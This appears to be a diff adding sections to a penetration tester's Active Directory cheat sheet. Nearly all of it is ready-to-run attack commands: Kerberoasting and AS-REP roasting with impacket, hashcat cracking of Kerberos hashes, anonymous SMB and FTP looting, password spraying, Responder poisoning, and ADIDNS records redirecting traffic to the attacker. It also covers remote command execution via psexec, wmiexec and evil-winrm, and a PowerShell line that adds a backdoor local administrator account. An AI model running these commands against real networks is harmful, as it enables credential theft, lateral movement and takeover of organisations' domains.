+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
+creds search ftp
+nmap $TARGET --script "ssl* and not brute" -p 443
+KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
+echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
+wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
+smbme $TARGET
+mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
+impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
+tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
+echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
+cp hashes /mnt/c/hashcat
+cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
+
+
+# Exploitation (Post-creds)
+## Initial Enumeration
+[*] Bloodhound
++---------- Start ----------+
+Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
+.\bloodhound-cli resetpwd
+http://127.0.0.1:7474
+neo4j:bloodhoundcommunityedition
+http://127.0.0.1:8080
+admin:RANDOM_PASSWORD
+
++---------- Queries ----------+
+-->> Privileges: Groups with Users and Computers
+MATCH p=(n)-[r*1..]-(m)
+WHERE (n:User OR n:Computer)
+  AND (m:User OR m:Computer)
+  AND ALL(x IN nodes(p) WHERE x:User OR x:Computer)
+RETURN p
+LIMIT 1000
+
+MATCH (g:Group)<-[:MemberOf]-(e)-[r1]->(n1)-[r2]->(n2)
+WHERE (e:User OR e:Computer)
+  AND NOT toLower(e.name) CONTAINS "admin"
+  AND NOT toLower(e.name) CONTAINS "guest"
+  AND NOT toLower(g.name) CONTAINS "admin"
+  AND NOT toLower(g.name) CONTAINS "guest"
+  AND NOT toLower(g.name) CONTAINS "domain users"
+  AND NOT toLower(n1.name) CONTAINS "admin"
+  AND NOT toLower(n1.name) CONTAINS "domain users"
+  AND NOT toLower(n2.name) CONTAINS "admin"
+  AND NOT toLower(n2.name) CONTAINS "domain users"
+  AND NOT (n1:Container AND toLower(n1.name) CONTAINS "users")
+  AND NOT (n2:Container AND toLower(n2.name) CONTAINS "users")
+WITH e, r1, n1, r2, n2
+OPTIONAL MATCH (n2)-[r3]->(connected)
+RETURN DISTINCT e, r1, n1, r2, n2, r3, connected
+LIMIT 1000
+
+## Decoding and Decompressing
+echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
+tar -xzvf backup.tar.gz -C .
+unzip backup.zip -d .
+
+## Spray Services
+sprayme '$USERNAME:$PASSWORD' <HOSTS_FILE>
+
+## Valid Creds
+-->> Keep Clock Synced
+sudo skewme $TARGET
+
+-->> Get Bloodhound Data
+impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
+bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
+//$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
+
+-->> Get Usernames and Computers
+cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
+cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
+impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
+
+-->> Initial Attacks
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
+impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
+sudo responder -I tun0 -v
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
+
+-->> Login or Execute Commands
+evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm-py -i $DC -r $DOM
+impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
+impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
+impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
+impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
+
+-->> Create Local Admin Account
+powershell -c "net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add"
 
 # Post-Exploitation 
 ## Start Fileserver
